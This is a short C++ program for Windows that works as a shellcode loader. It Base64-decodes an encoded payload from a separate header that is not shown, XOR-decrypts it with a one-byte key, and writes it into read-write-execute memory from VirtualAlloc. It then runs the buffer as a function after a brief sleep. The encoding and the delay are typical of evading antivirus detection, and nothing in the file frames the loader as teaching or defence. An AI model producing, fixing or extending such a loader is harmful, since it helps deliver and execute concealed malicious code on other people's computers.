#include <windows.h>
#include <wincrypt.h>
#include <cstdint>
#include <iostream>
#include <cstring>   // <-- add this
#include <vector>
#include "shellcode_encoded.h"

#pragma comment(lib, "crypt32.lib")

// Decode Base64 string into a std::vector<uint8_t>
std::vector<uint8_t> Base64Decode(const char* input) {
    DWORD len = 0;

    // First call to get required length
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, nullptr, &len, nullptr, nullptr)) {
        std::cerr << "CryptStringToBinaryA (len) failed. Error: " 
                  << GetLastError() << std::endl;
        return {};
    }

    std::vector<uint8_t> output(len);

    // Second call to actually decode
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, output.data(), &len, nullptr, nullptr)) {
        std::cerr << "CryptStringToBinaryA (decode) failed. Error: " 
                  << GetLastError() << std::endl;
        return {};
    }

    return output;
}

// Simple XOR decryption
void DecryptShellcode(std::vector<uint8_t>& data, uint8_t key) {
    for (auto& byte : data) {
        byte ^= key;
    }
}

// Allocate RWX memory and execute buffer as code
void ExecuteShellcode(const std::vector<uint8_t>& shellcode) {
    if (shellcode.empty()) {
        std::cerr << "Shellcode buffer is empty, not executing." << std::endl;
        return;
    }

    LPVOID exec = VirtualAlloc(
        nullptr,
        shellcode.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!exec) {
        std::cerr << "VirtualAlloc failed. Error: " << GetLastError() << std::endl;
        return;
    }

    std::memcpy(exec, shellcode.data(), shellcode.size());

    auto func = reinterpret_cast<void(*)()>(exec);
    func();
}

int main() {
    Sleep(1500);

    // b64_shellcode and XOR_KEY are assumed to be defined in "shellcode_encoded.h"
    auto decoded = Base64Decode(b64_shellcode);
    if (decoded.empty()) {
        std::cerr << "Failed to decode base64 shellcode." << std::endl;
        return 1;
    }

    DecryptShellcode(decoded, static_cast<uint8_t>(XOR_KEY));
    ExecuteShellcode(decoded);

    return 0;
}
